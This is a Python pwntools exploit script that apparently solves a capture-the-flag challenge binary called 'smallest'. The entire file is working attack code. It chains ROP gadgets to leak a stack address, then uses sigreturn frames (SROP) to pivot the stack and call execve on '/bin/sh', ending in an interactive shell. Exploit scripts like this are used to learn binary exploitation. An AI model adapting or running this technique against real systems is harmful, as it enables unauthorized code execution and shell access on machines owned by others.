#!/usr/bin/env python2
from pwn import *
import time
context(arch = "amd64",os = "linux", log_level = "debug")

p = process('./smallest')
elf = ELF('./smallest')
#gdb.attach(p, 'b *0x4000C0')
time.sleep(1)

CLEAR_EAX_READ_ADDR = 0x4000B0
READ_ADDR = 0x4000B3
SYSCALL_ADDR = 0x4000BE
RET_ADDR = 0x4000C0

payload = ""
payload += p64(CLEAR_EAX_READ_ADDR) # Set Syscall ID(write, 1) to RAX: Input 15 Characters
payload += p64(READ_ADDR) # write(stdout, rsp, 0x400)
payload += p64(CLEAR_EAX_READ_ADDR) # Back to read()

p.send(payload)
raw_input()
p.send('\xb3') # Low Byte of READ_ADDR
p.recv(0x8)
leak_stack = u64(p.recv(0x8)) & 0xffffffffffff0000
bin_sh_addr = leak_stack + 0x300
print("leak stack: ", hex(leak_stack))
raw_input()

payload = p64(CLEAR_EAX_READ_ADDR) # Set Syscall ID(rt_sigreturn, 15) to RAX: Input 15 Characters
payload += p64(SYSCALL_ADDR) # Do rt_sigreturn() Syscall
frame = SigreturnFrame()
frame.rax = constants.SYS_read # do read
frame.rdi = 0 # fd
frame.rsi = leak_stack # buf
frame.rdx = 0x500 # count
frame.rip = SYSCALL_ADDR
frame.rsp = leak_stack # migrate stack to leak_stack
payload += bytes(frame)
p.send(payload)
raw_input()
p.send(p64(SYSCALL_ADDR) + '\x00' * 7)
raw_input()

payload = p64(CLEAR_EAX_READ_ADDR) # Set Syscall ID(rt_sigreturn, 15) to RAX: Input 15 Characters
payload += p64(SYSCALL_ADDR) # Do rt_sigreturn() Syscall
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rip = SYSCALL_ADDR
frame.rsp = leak_stack # migrate stack to leak_stack
payload += bytes(frame)
payload += (0x300-len(payload)) * 'A' + "/bin/sh\x00"
p.send(payload)
raw_input()
p.send(p64(SYSCALL_ADDR) + '\x00' * 7)
raw_input()
p.interactive()